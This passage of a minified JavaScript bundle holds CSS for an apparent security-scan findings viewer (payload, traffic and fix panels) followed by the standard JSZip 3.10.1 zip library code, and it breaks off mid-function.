    .src-detail-tab.active { color:var(--primary-light); border-bottom-color:var(--primary); background:rgba(75,110,175,0.08); }
    .src-detail-panel { display:none; padding:18px; }
    .src-detail-panel.active { display:block; }

    .src-detail-section { margin-bottom:18px; }
    .src-section-title { font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px; display:flex; align-items:center; gap:6px; text-transform:uppercase; letter-spacing:0.3px; }
    .src-section-body { font-size:13px; color:var(--text); line-height:1.7; }
    .src-kv { display:flex; gap:10px; margin-bottom:6px; align-items:flex-start; }
    .src-k { min-width:60px; color:var(--text-secondary); font-size:12px; }
    .src-v { flex:1; word-break:break-all; }
    .src-repro-steps { padding-left:18px; margin:0; }
    .src-repro-steps li { margin-bottom:6px; }

    .src-evidence-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; flex-wrap:wrap; }
    .src-evidence-label { font-size:12px; color:var(--text-secondary); min-width:60px; }
    .src-payload { background:#3b0d0d; color:#fecaca; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid rgba(199,84,80,0.35); font-size:12px; word-break:break-all; flex:1; }
    .src-signature { background:#2b2b2b; color:#bbbbbb; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid var(--border-light); font-size:12px; word-break:break-all; flex:1; font-family:var(--font); }
    .src-traffic-viewer { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
    @media (max-width:1100px) { .src-traffic-viewer { grid-template-columns:1fr; } }
    .src-traffic-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); overflow:hidden; display:flex; flex-direction:column; min-height:180px; }
    .src-traffic-header { display:flex; align-items:center; justify-content:space-between; padding:8px 12px; background:var(--bg-secondary); border-bottom:1px solid var(--border-light); font-size:12px; font-weight:600; color:var(--text-secondary); }
    .src-traffic-header .src-copy-btn { margin:0; }
    .src-traffic-panel pre { margin:0; padding:12px; overflow:auto; max-height:420px; flex:1; }
    .src-traffic-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }
    .src-screenshot-row img { max-width:100%; border:1px solid var(--border-light); border-radius:var(--radius-sm); margin-top:6px; }
    .src-no-evidence { color:var(--text-secondary); font-size:12px; }

    .src-fix-tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px; }
    .src-fix-tab { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:5px 12px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-fix-tab.active { background:var(--primary); color:#fff; border-color:var(--primary); }
    .src-fix-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); padding:12px; position:relative; }
    .src-fix-panel.hidden { display:none; }
    .src-fix-panel pre { margin:0; overflow:auto; max-height:360px; }
    .src-fix-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }

    .src-copy-btn { background:rgba(75,110,175,0.15); border:1px solid rgba(75,110,175,0.3); color:var(--primary-light); padding:4px 10px; border-radius:var(--radius-xs); cursor:pointer; font-size:11px; }
    .src-copy-btn:hover { background:var(--primary); color:#fff; }
    .src-references { padding-left:18px; margin:0; }
    .src-references li { margin-bottom:6px; word-break:break-all; }
    .src-detail-actions { display:flex; gap:10px; flex-wrap:wrap; padding:0 18px 18px; }
    .src-action-btn { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:6px 14px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-action-btn:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-action-btn.verify { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-action-btn.false-positive { background:rgba(115,201,144,0.12); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-action-btn.confirm { background:rgba(199,84,80,0.12); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-action-btn.ticket { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-detail-footer { font-size:12px; color:var(--text-secondary); border-top:1px solid var(--border-light); padding:12px 18px; }
    .src-empty { padding:30px; text-align:center; color:var(--text-secondary); }
    .src-empty-detail { padding:40px; text-align:center; color:var(--text-secondary); background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); }
  `,document.head.appendChild(e)}function as(){ss()}var Lt=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function os(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function Bt(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var ii={exports:{}};/*!

JSZip v3.10.1 - A JavaScript class for generating and reading zip files
<http://stuartk.com/jszip>

(c) 2009-2016 Stuart Knightley <stuart [at] stuartk.com>
Dual licenced under the MIT license or GPLv3. See https://raw.github.com/Stuk/jszip/main/LICENSE.markdown.

JSZip uses the library pako released under the MIT license :
https://github.com/nodeca/pako/blob/main/LICENSE
*/var Ni;function ls(){return Ni||(Ni=1,(function(e,i){(function(t){e.exports=t()})(function(){return(function t(r,s,a){function o(u,h){if(!s[u]){if(!r[u]){var c=typeof Bt=="function"&&Bt;if(!h&&c)return c(u,!0);if(n)return n(u,!0);var p=new Error("Cannot find module '"+u+"'");throw p.code="MODULE_NOT_FOUND",p}var v=s[u]={exports:{}};r[u][0].call(v.exports,function(m){var g=r[u][1][m];return o(g||m)},v,v.exports,t,r,s,a)}return s[u].exports}for(var n=typeof Bt=="function"&&Bt,d=0;d<a.length;d++)o(a[d]);return o})({1:[function(t,r,s){var a=t("./utils"),o=t("./support"),n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";s.encode=function(d){for(var u,h,c,p,v,m,g,y=[],b=0,_=d.length,x=_,I=a.getTypeOf(d)!=="string";b<d.length;)x=_-b,c=I?(u=d[b++],h=b<_?d[b++]:0,b<_?d[b++]:0):(u=d.charCodeAt(b++),h=b<_?d.charCodeAt(b++):0,b<_?d.charCodeAt(b++):0),p=u>>2,v=(3&u)<<4|h>>4,m=1<x?(15&h)<<2|c>>6:64,g=2<x?63&c:64,y.push(n.charAt(p)+n.charAt(v)+n.charAt(m)+n.charAt(g));return y.join("")},s.decode=function(d){var u,h,c,p,v,m,g=0,y=0,b="data:";if(d.substr(0,b.length)===b)throw new Error("Invalid base64 input, it looks like a data url.");var _,x=3*(d=d.replace(/[^A-Za-z0-9+/=]/g,"")).length/4;if(d.charAt(d.length-1)===n.charAt(64)&&x--,d.charAt(d.length-2)===n.charAt(64)&&x--,x%1!=0)throw new Error("Invalid base64 input, bad content length.");for(_=o.uint8array?new Uint8Array(0|x):new Array(0|x);g<d.length;)u=n.indexOf(d.charAt(g++))<<2|(p=n.indexOf(d.charAt(g++)))>>4,h=(15&p)<<4|(v=n.indexOf(d.charAt(g++)))>>2,c=(3&v)<<6|(m=n.indexOf(d.charAt(g++))),_[y++]=u,v!==64&&(_[y++]=h),m!==64&&(_[y++]=c);return _}},{"./support":30,"./utils":32}],2:[function(t,r,s){var a=t("./external"),o=t("./stream/DataWorker"),n=t("./stream/Crc32Probe"),d=t("./stream/DataLengthProbe");function u(h,c,p,v,m){this.compressedSize=h,this.uncompressedSize=c,this.crc32=p,this.compression=v,this.compressedContent=m}u.prototype={getContentWorker:function(){var h=new o(a.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new d("data_length")),c=this;return h.on("end",function(){if(this.streamInfo.data_length!==c.uncompressedSize)throw new Error("Bug : uncompressed data size mismatch")}),h},getCompressedWorker:function(){return new o(a.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize",this.compressedSize).withStreamInfo("uncompressedSize",this.uncompressedSize).withStreamInfo("crc32",this.crc32).withStreamInfo("compression",this.compression)}},u.createWorkerFrom=function(h,c,p){return h.pipe(new n).pipe(new d("uncompressedSize")).pipe(c.compressWorker(p)).pipe(new d("compressedSize")).withStreamInfo("compression",c)},r.exports=u},{"./external":6,"./stream/Crc32Probe":25,"./stream/DataLengthProbe":26,"./stream/DataWorker":27}],3:[function(t,r,s){var a=t("./stream/GenericWorker");s.STORE={magic:"\0\0",compressWorker:function(){return new a("STORE compression")},uncompressWorker:function(){return new a("STORE decompression")}},s.DEFLATE=t("./flate")},{"./flate":7,"./stream/GenericWorker":28}],4:[function(t,r,s){var a=t("./utils"),o=(function(){for(var n,d=[],u=0;u<256;u++){n=u;for(var h=0;h<8;h++)n=1&n?3988292384^n>>>1:n>>>1;d[u]=n}return d})();r.exports=function(n,d){return n!==void 0&&n.length?a.getTypeOf(n)!=="string"?(function(u,h,c,p){var v=o,m=p+c;u^=-1;for(var g=p;g<m;g++)u=u>>>8^v[255&(u^h[g])];return-1^u})(0|d,n,n.length,0):(function(u,h,c,p){var v=o,m=p+c;u^=-1;for(var g=p;g<m;g++)u=u>>>8^v[255&(u^h.charCodeAt(g))];return-1^u})(0|d,n,n.length,0):0}},{"./utils":32}],5:[function(t,r,s){s.base64=!1,s.binary=!1,s.dir=!1,s.createFolders=!0,s.date=null,s.compression=null,s.compressionOptions=null,s.comment=null,s.unixPermissions=null,s.dosPermissions=null},{}],6:[function(t,r,s){var a=null;a=typeof Promise<"u"?Promise:t("lie"),r.exports={Promise:a}},{lie:37}],7:[function(t,r,s){var a=typeof Uint8Array<"u"&&typeof Uint16Array<"u"&&typeof Uint32Array<"u",o=t("pako"),n=t("./utils"),d=t("./stream/GenericWorker"),u=a?"uint8array":"array";function h(c,p){d.call(this,"FlateWorker/"+c),this._pako=null,this._pakoAction=c,this._pakoOptions=p,this.meta={}}s.magic="\b\0",n.inherits(h,d),h.prototype.processChunk=function(c){this.meta=c.meta,this._pako===null&&this._createPako(),this._pako.push(n.transformTo(u,c.data),!1)},h.prototype.flush=function(){d.prototype.flush.call(this),this._pako===null&&this._createPako(),this._pako.push([],!0)},h.prototype.cleanUp=function(){d.prototype.cleanUp.call(this),this._pako=null},h.prototype._createPako=function(){this._pako=new o[this._pakoAction]({raw:!0,level:this._pakoOptions.level||-1});var c=this;this._pako.onData=function(p){c.push({data:p,meta:c.meta})}},s.compressWorker=function(c){return new h("Deflate",c)},s.uncompressWorker=function(){return new h("Inflate",{})}},{"./stream/GenericWorker":28,"./utils":32,pako:38}],8:[function(t,r,s){function a(v,m){var g,y="";for(g=0;g<m;g++)y+=String.fromCharCode(255&v),v>>>=8;return y}function o(v,m,g,y,b,_){var x,I,z=v.file,M=v.compression,O=_!==u.utf8encode,j=n.transformTo("string",_(z.name)),P=n.transformTo("string",u.utf8encode(z.name)),H=z.comment,K=n.transformTo("string",_(H)),E=n.transformTo("string",u.utf8encode(H)),N=P.length!==z.name.length,l=E.length!==H.length,L="",J="",D="",$=z.dir,q=z.date,te={crc32:0,compressedSize:0,uncompressedSize:0};m&&!g||(te.crc32=v.crc32,te.compressedSize=v.compressedSize,te.uncompressedSize=v.uncompressedSize);var B=0;m&&(B|=8),O||!N&&!l||(B|=2048);var A=0,ee=0;$&&(A|=16),b==="UNIX"?(ee=798,A|=(function(X,ge){var re=X;return X||(re=ge?16893:33204),(65535&re)<<16})(z.unixPermissions,$)):(ee=20,A|=(function(X){return 63&(X||0)})(z.dosPermissions)),x=q.getUTCHours(),x<<=6,x|=q.getUTCMinutes(),x<<=5,x|=q.getUTCSeconds()/2,I=q.getUTCFullYear()-1980,I<<=4,I|=q.getUTCMonth()+1,I<<=5,I|=q.getUTCDate(),N&&(J=a(1,1)+a(h(j),4)+P,L+="up"+a(J.length,2)+J),l&&(D=a(1,1)+a(h(K),4)+E,L+="uc"+a(D.length,2)+D);var Y="";return Y+=`
\0`,Y+=a(B,2),Y+=M.magic,Y+=a(x,2),Y+=a(I,2),Y+=a(te.crc32,4),Y+=a(te.compressedSize,4),Y+=a(te.uncompressedSize,4),Y+=a(j.length,2),Y+=a(L.length,2),{fileRecord:c.LOCAL_FILE_HEADER+Y+j+L,dirRecord:c.CENTRAL_FILE_HEADER+a(ee,2)+Y+a(K.length,2)+"\0\0\0\0"+a(A,4)+a(y,4)+j+L+K}}var n=t("../utils"),d=t("../stream/GenericWorker"),u=t("../utf8"),h=t("../crc32"),c=t("../signature");function p(v,m,g,y){d.call(this,"ZipFileWorker"),this.bytesWritten=0,this.zipComment=m,this.zipPlatform=g,this.encodeFileName=y,this.streamFiles=v,this.accumulate=!1,this.contentBuffer=[],this.dirRecords=[],this.currentSourceOffset=0,this.entriesCount=0,this.currentFile=null,this._sources=[]}n.inherits(p,d),p.prototype.push=function(v){var m=v.meta.percent||0,g=this.entriesCount,y=this._sources.length;this.accumulate?this.contentBuffer.push(v):(this.bytesWritten+=v.data.length,d.prototype.push.call(this,{data:v.data,meta:{currentFile:this.currentFile,percent:g?(m+100*(g-y-1))/g:100}}))},p.prototype.openedSource=function(v){this.currentSourceOffset=this.bytesWritten,this.currentFile=v.file.name;var m=this.streamFiles&&!v.file.dir;if(m){var g=o(v,m,!1,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);this.push({data:g.fileRecord,meta:{percent:0}})}else this.accumulate=!0},p.prototype.closedSource=function(v){this.accumulate=!1;var m=this.streamFiles&&!v.file.dir,g=o(v,m,!0,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);if(this.dirRecords.push(g.dirRecord),m)this.push({data:(function(y){return c.DATA_DESCRIPTOR+a(y.crc32,4)+a(y.compressedSize,4)+a(y.uncompressedSize,4)})(v),meta:{percent:100}});else for(this.push({data:g.fileRecord,meta:{percent:0}});this.contentBuffer.length;)this.push(this.contentBuffer.shift());this.currentFile=null},p.prototype.flush=function(){for(var v=this.bytesWritten,m=0;m<this.dirRecords.length;m++)this.push({data:this.dirRecords[m],meta:{percent:100}});var g=this.bytesWritten-v,y=(function(b,_,x,I,z){var M=n.transformTo("string",z(I));return c.CENTRAL_DIRECTORY_END+"\0\0\0\0"+a(b,2)+a(b,2)+a(_,4)+a(x,4)+a(M.length,2)+M})(this.dirRecords.length,g,v,this.zipComment,this.encodeFileName);this.push({data:y,meta:{percent:100}})},p.prototype.prepareNextSource=function(){this.previous=this._sources.shift(),this.openedSource(this.previous.streamInfo),this.isPaused?this.previous.pause():this.previous.resume()},p.prototype.registerPrevious=function(v){this._sources.push(v);var m=this;return v.on("data",function(g){m.processChunk(g)}),v.on("end",function(){m.closedSource(m.previous.streamInfo),m._sources.length?m.prepareNextSource():m.end()}),v.on("error",function(g){m.error(g)}),this},p.prototype.resume=function(){return!!d.prototype.resume.call(this)&&(!this.previous&&this._sources.length?(this.prepareNextSource(),!0):this.previous||this._sources.length||this.generatedError?void 0:(this.end(),!0))},p.prototype.error=function(v){var m=this._sources;if(!d.prototype.error.call(this,v))return!1;for(var g=0;g<m.length;g++)try{m[g].error(v)}catch{}return!0},p.prototype.lock=function(){d.prototype.lock.call(this);for(var v=this._sources,m=0;m<v.length;m++)v[m].lock()},r.exports=p},{"../crc32":4,"../signature":23,"../stream/GenericWorker":28,"../utf8":31,"../utils":32}],9:[function(t,r,s){var a=t("../compressions"),o=t("./ZipFileWorker");s.generateWorker=function(n,d,u){var h=new o(d.streamFiles,u,d.platform,d.encodeFileName),c=0;try{n.forEach(function(p,v){c++;var m=(function(_,x){var I=_||x,z=a[I];if(!z)throw new Error(I+" is not a valid compression method !");return z})(v.options.compression,d.compression),g=v.options.compressionOptions||d.compressionOptions||{},y=v.dir,b=v.date;v._compressWorker(m,g).withStreamInfo("file",{name:p,dir:y,date:b,comment:v.comment||"",unixPermissions:v.unixPermissions,dosPermissions:v.dosPermissions}).pipe(h)}),h.entriesCount=c}catch(p){h.error(p)}return h}},{"../compressions":3,"./ZipFileWorker":8}],10:[function(t,r,s){function a(){if(!(this instanceof a))return new a;if(arguments.length)throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");this.files=Object.create(null),this.comment=null,this.root="",this.clone=function(){var o=new a;for(var n in this)typeof this[n]!="function"&&(o[n]=this[n]);return o}}(a.prototype=t("./object")).loadAsync=t("./load"),a.support=t("./support"),a.defaults=t("./defaults"),a.version="3.10.1",a.loadAsync=function(o,n){return new a().loadAsync(o,n)},a.external=t("./external"),r.exports=a},{"./defaults":5,"./external":6,"./load":11,"./object":15,"./support":30}],11:[function(t,r,s){var a=t("./utils"),o=t("./external"),n=t("./utf8"),d=t("./zipEntries"),u=t("./stream/Crc32Probe"),h=t("./nodejsUtils");function c(p){return new o.Promise(function(v,m){var g=p.decompressed.getContentWorker().pipe(new u);g.on("error",function(y){m(y)}).on("end",function(){g.streamInfo.crc32!==p.decompressed.crc32?m(new Error("Corrupted zip : CRC32 mismatch")):v()}).resume()})}r.exports=function(p,v){var m=this;return v=a.extend(v||{},{base64:!1,checkCRC32:!1,optimizedBinaryString:!1,createFolders:!1,decodeFileName:n.utf8decode}),h.isNode&&h.isStream(p)?o.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")):a.prepareContent("the loaded zip file",p,!0,v.optimizedBinaryString,v.base64).then(function(g){var y=new d(v);return y.load(g),y}).then(function(g){var y=[o.Promise.resolve(g)],b=g.files;if(v.checkCRC32)for(var _=0;_<b.length;_++)y.push(c(b[_]));return o.Promise.all(y)}).then(function(g){for(var y=g.shift(),b=y.files,_=0;_<b.length;_++){var x=b[_],I=x.fileNameStr,z=a.resolve(x.fileNameStr);m.file(z,x.decompressed,{binary:!0,optimizedBinaryString:!0,date:x.date,dir:x.dir,comment:x.fileCommentStr.length?x.fileCommentStr:null,unixPermissions:x.unixPermissions,dosPermissions:x.dosPermissions,createFolders:v.createFolders}),x.dir||(m.file(z).unsafeOriginalName=I)}return y.zipComment.length&&(m.comment=y.zipComment),m})}},{"./external":6,"./nodejsUtils":14,"./stream/Crc32Probe":25,"./utf8":31,"./utils":32,"./zipEntries":33}],12:[function(t,r,s){var a=t("../utils"),o=t("../stream/GenericWorker");function n(d,u){o.call(this,"Nodejs stream input adapter for "+d),this._upstreamEnded=!1,this._bindStream(u)}a.inherits(n,o),n.prototype._bindStream=function(d){var u=this;(this._stream=d).pause(),d.on("data",function(h){u.push({data:h,meta:{percent:0}})}).on("error",function(h){u.isPaused?this.generatedError=h:u.error(h)}).on("end",function(){u.isPaused?u._upstreamEnded=!0:u.end()})},n.prototype.pause=function(){return!!o.prototype.pause.call(this)&&(this._stream.pause(),!0)},n.prototype.resume=function(){return!!o.prototype.resume.call(this)&&(this._upstreamEnded?this.end():this._stream.resume(),!0)},r.exports=n},{"../stream/GenericWorker":28,"../utils":32}],13:[function(t,r,s){var a=t("readable-stream").Readable;function o(n,d,u){a.call(this,d),this._helper=n;var h=this;n.on("data",function(c,p){h.push(c)||h._helper.pause(),u&&u(p)}).on("error",function(c){h.emit("error",c)}).on("end",function(){h.push(null)})}t("../utils").inherits(o,a),o.prototype._read=function(){this._helper.resume()},r.exports=o},{"../utils":32,"readable-stream":16}],14:[function(t,r,s){r.exports={isNode:typeof Buffer<"u",newBufferFrom:function(a,o){if(Buffer.from&&Buffer.from!==Uint8Array.from)return Buffer.from(a,o);if(typeof a=="number")throw new Error('The "data" argument must not be a number');return new Buffer(a,o)},allocBuffer:function(a){if(Buffer.alloc)return Buffer.alloc(a);var o=new Buffer(a);return o.fill(0),o},isBuffer:function(a){return Buffer.isBuffer(a)},isStream:function(a){return a&&typeof a.on=="function"&&typeof a.pause=="function"&&typeof a.resume=="function"}}},{}],15:[function(t,r,s){function a(z,M,O){var j,P=n.getTypeOf(M),H=n.extend(O||{},h);H.date=H.date||new Date,H.compression!==null&&(H.compression=H.compression.toUpperCase()),typeof H.unixPermissions=="string"&&(H.unixPermissions=parseInt(H.unixPermissions,8)),H.unixPermissions&&16384&H.unixPermissions&&(H.dir=!0),H.dosPermissions&&16&H.dosPermissions&&(H.dir=!0),H.dir&&(z=b(z)),H.createFolders&&(j=y(z))&&_.call(this,j,!0);var K=P==="string"&&H.binary===!1&&H.base64===!1;O&&O.binary!==void 0||(H.binary=!K),(M instanceof c&&M.uncompressedSize===0||H.dir||!M||M.length===0)&&(H.base64=!1,H.binary=!0,M="",H.compression="STORE",P="string");var E=null;E=M instanceof c||M instanceof d?M:m.isNode&&m.isStream(M)?new g(z,M):n.prepareContent(z,M,H.binary,H.optimizedBinaryString,H.base64);var N=new p(z,E,H);this.files[z]=N}var o=t("./utf8"),n=t("./utils"),d=t("./stream/GenericWorker"),u=t("./stream/StreamHelper"),h=t("./defaults"),c=t("./compressedObject"),p=t("./zipObject"),v=t("./generate"),m=t("./nodejsUtils"),g=t("./nodejs/NodejsStreamInputAdapter"),y=function(z){z.slice(-1)==="/"&&(z=z.substring(0,z.length-1));var M=z.lastIndexOf("/");return 0<M?z.substring(0,M):""},b=function(z){return z.slice(-1)!=="/"&&(z+="/"),z},_=function(z,M){return M=M!==void 0?M:h.createFolders,z=b(z),this.files[z]||a.call(this,z,null,{dir:!0,createFolders:M}),this.files[z]};function x(z){return Object.prototype.toString.call(z)==="[object RegExp]"}var I={load:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},forEach:function(z){var M,O,j;for(M in this.files)j=this.files[M],(O=M.slice(this.root.length,M.length))&&M.slice(0,this.root.length)===this.root&&z(O,j)},filter:function(z){var M=[];return this.forEach(function(O,j){z(O,j)&&M.push(j)}),M},file:function(z,M,O){if(arguments.length!==1)return z=this.root+z,a.call(this,z,M,O),this;if(x(z)){var j=z;return this.filter(function(H,K){return!K.dir&&j.test(H)})}var P=this.files[this.root+z];return P&&!P.dir?P:null},folder:function(z){if(!z)return this;if(x(z))return this.filter(function(P,H){return H.dir&&z.test(P)});var M=this.root+z,O=_.call(this,M),j=this.clone();return j.root=O.name,j},remove:function(z){z=this.root+z;var M=this.files[z];if(M||(z.slice(-1)!=="/"&&(z+="/"),M=this.files[z]),M&&!M.dir)delete this.files[z];else for(var O=this.filter(function(P,H){return H.name.slice(0,z.length)===z}),j=0;j<O.length;j++)delete this.files[O[j].name];return this},generate:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},generateInternalStream:function(z){var M,O={};try{if((O=n.extend(z||{},{streamFiles:!1,compression:"STORE",compressionOptions:null,type:"",platform:"DOS",comment:null,mimeType:"application/zip",encodeFileName:o.utf8encode})).type=O.type.toLowerCase(),O.compression=O.compression.toUpperCase(),O.type==="binarystring"&&(O.type="string"),!O.type)throw new Error("No output type specified.");n.checkSupport(O.type),O.platform!=="darwin"&&O.platform!=="freebsd"&&O.platform!=="linux"&&O.platform!=="sunos"||(O.platform="UNIX"),O.platform==="win32"&&(O.platform="DOS");var j=O.comment||this.comment||"";M=v.generateWorker(this,O,j)}catch(P){(M=new d("error")).error(P)}return new u(M,O.type||"string",O.mimeType)},generateAsync:function(z,M){return this.generateInternalStream(z).accumulate(M)},generateNodeStream:function(z,M){return(z=z||{}).type||(z.type="nodebuffer"),this.generateInternalStream(z).toNodejsStream(M)}};r.exports=I},{"./compressedObject":2,"./defaults":5,"./generate":9,"./nodejs/NodejsStreamInputAdapter":12,"./nodejsUtils":14,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31,"./utils":32,"./zipObject":35}],16:[function(t,r,s){r.exports=t("stream")},{stream:void 0}],17:[function(t,r,s){var a=t("./DataReader");function o(n){a.call(this,n);for(var d=0;d<this.data.length;d++)n[d]=255&n[d]}t("../utils").inherits(o,a),o.prototype.byteAt=function(n){return this.data[this.zero+n]},o.prototype.lastIndexOfSignature=function(n){for(var d=n.charCodeAt(0),u=n.charCodeAt(1),h=n.charCodeAt(2),c=n.charCodeAt(3),p=this.length-4;0<=p;--p)if(this.data[p]===d&&this.data[p+1]===u&&this.data[p+2]===h&&this.data[p+3]===c)return p-this.zero;return-1},o.prototype.readAndCheckSignature=function(n){var d=n.charCodeAt(0),u=n.charCodeAt(1),h=n.charCodeAt(2),c=n.charCodeAt(3),p=this.readData(4);return d===p[0]&&u===p[1]&&h===p[2]&&c===p[3]},o.prototype.readData=function(n){if(this.checkOffset(n),n===0)return[];var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},r.exports=o},{"../utils":32,"./DataReader":18}],18:[function(t,r,s){var a=t("../utils");function o(n){this.data=n,this.length=n.length,this.index=0,this.zero=0}o.prototype={checkOffset:function(n){this.checkIndex(this.index+n)},checkIndex:function(n){if(this.length<this.zero+n||n<0)throw new Error("End of data reached (data length = "+this.length+", asked index = "+n+"). Corrupted zip ?")},setIndex:function(n){this.checkIndex(n),this.index=n},skip:function(n){this.setIndex(this.index+n)},byteAt:function(){},readInt:function(n){var d,u=0;for(this.checkOffset(n),d=this.index+n-1;d>=this.index;d--)u=(u<<8)+this.byteAt(d);return this.index+=n,u},readString:function(n){return a.transformTo("string",this.readData(n))},readData:function(){},lastIndexOfSignature:function(){},readAndCheckSignature:function(){},readDate:function(){var n=this.readInt(4);return new Date(Date.UTC(1980+(n>>25&127),(n>>21&15)-1,n>>16&31,n>>11&31,n>>5&63,(31&n)<<1))}},r.exports=o},{"../utils":32}],19:[function(t,r,s){var a=t("./Uint8ArrayReader");function o(n){a.call(this,n)}t("../utils").inherits(o,a),o.prototype.readData=function(n){this.checkOffset(n);var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},r.exports=o},{"../utils":32,"./Uint8ArrayReader":21}],20:[function(t,r,s){var a=t("./DataReader");function o(n){a.call(this,n)}t("../utils").inherits(o,a),o.prototype.byteAt=function(n){return this.data.charCodeAt(this.zero+n)},o.prototype.lastIndexOfSignature=function(n){return this.data.lastIndexOf(n)-this.zero},o.prototype.readAndCheckSignature=function(n){return n===this.readData(4)},o.prototype.readData=function(n){this.checkOffset(n);var d=this.data.slice(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},r.exports=o},{"../utils":32,"./DataReader":18}],21:[function(t,r,s){var a=t("./ArrayReader");function o(n){a.call(this,n)}t("../utils").inherits(o,a),o.prototype.readData=function(n){if(this.checkOffset(n),n===0)return new Uint8Array(0);var d=this.data.subarray(this.zero+this.index,this.zero+this.index+n);return this.index+=n,d},r.exports=o},{"../utils":32,"./ArrayReader":17}],22:[function(t,r,s){var a=t("../utils"),o=t("../support"),n=t("./ArrayReader"),d=t("./StringReader"),u=t("./NodeBufferReader"),h=t("./Uint8ArrayReader");r.exports=function(c){var p=a.getTypeOf(c);return a.checkSupport(p),p!=="string"||o.uint8array?p==="nodebuffer"?new u(c):o.uint8array?new h(a.transformTo("uint8array",c)):new n(a.transformTo("array",c)):new d(c)}},{"../support":30,"../utils":32,"./ArrayReader":17,"./NodeBufferReader":19,"./StringReader":20,"./Uint8ArrayReader":21}],23:[function(t,r,s){s.LOCAL_FILE_HEADER="PK",s.CENTRAL_FILE_HEADER="PK",s.CENTRAL_DIRECTORY_END="PK",s.ZIP64_CENTRAL_DIRECTORY_LOCATOR="PK\x07",s.ZIP64_CENTRAL_DIRECTORY_END="PK",s.DATA_DESCRIPTOR="PK\x07\b"},{}],24:[function(t,r,s){var a=t("./GenericWorker"),o=t("../utils");function n(d){a.call(this,"ConvertWorker to "+d),this.destType=d}o.inherits(n,a),n.prototype.processChunk=function(d){this.push({data:o.transformTo(this.destType,d.data),meta:d.meta})},r.exports=n},{"../utils":32,"./GenericWorker":28}],25:[function(t,r,s){var a=t("./GenericWorker"),o=t("../crc32");function n(){a.call(this,"Crc32Probe"),this.withStreamInfo("crc32",0)}t("../utils").inherits(n,a),n.prototype.processChunk=function(d){this.streamInfo.crc32=o(d.data,this.streamInfo.crc32||0),this.push(d)},r.exports=n},{"../crc32":4,"../utils":32,"./GenericWorker":28}],26:[function(t,r,s){var a=t("../utils"),o=t("./GenericWorker");function n(d){o.call(this,"DataLengthProbe for "+d),this.propName=d,this.withStreamInfo(d,0)}a.inherits(n,o),n.prototype.processChunk=function(d){if(d){var u=this.streamInfo[this.propName]||0;this.streamInfo[this.propName]=u+d.data.length}o.prototype.processChunk.call(this,d)},r.exports=n},{"../utils":32,"./GenericWorker":28}],27:[function(t,r,s){var a=t("../utils"),o=t("./GenericWorker");function n(d){o.call(this,"DataWorker");var u=this;this.dataIsReady=!1,this.index=0,this.max=0,this.data=null,this.type="",this._tickScheduled=!1,d.then(function(h){u.dataIsReady=!0,u.data=h,u.max=h&&h.length||0,u.type=a.getTypeOf(h),u.isPaused||u._tickAndRepeat()},function(h){u.error(h)})}a.inherits(n,o),n.prototype.cleanUp=function(){o.prototype.cleanUp.call(this),this.data=null},n.prototype.resume=function(){return!!o.prototype.resume.call(this)&&(!this._tickScheduled&&this.dataIsReady&&(this._tickScheduled=!0,a.delay(this._tickAndRepeat,[],this)),!0)},n.prototype._tickAndRepeat=function(){this._tickScheduled=!1,this.isPaused||this.isFinished||(this._tick(),this.isFinished||(a.delay(this._tickAndRepeat,[],this),this._tickScheduled=!0))},n.prototype._tick=function(){if(this.isPaused||this.isFinished)return!1;var d=null,u=Math.min(this.max,this.index+16384);if(this.index>=this.max)return this.end();switch(this.type){case"string":d=this.data.substring(this.index,u);break;case"uint8array":d=this.data.subarray(this.index,u);break;case"array":case"nodebuffer":d=this.data.slice(this.index,u)}return this.index=u,this.push({data:d,meta:{percent:this.max?this.index/this.max*100:0}})},r.exports=n},{"../utils":32,"./GenericWorker":28}],28:[function(t,r,s){function 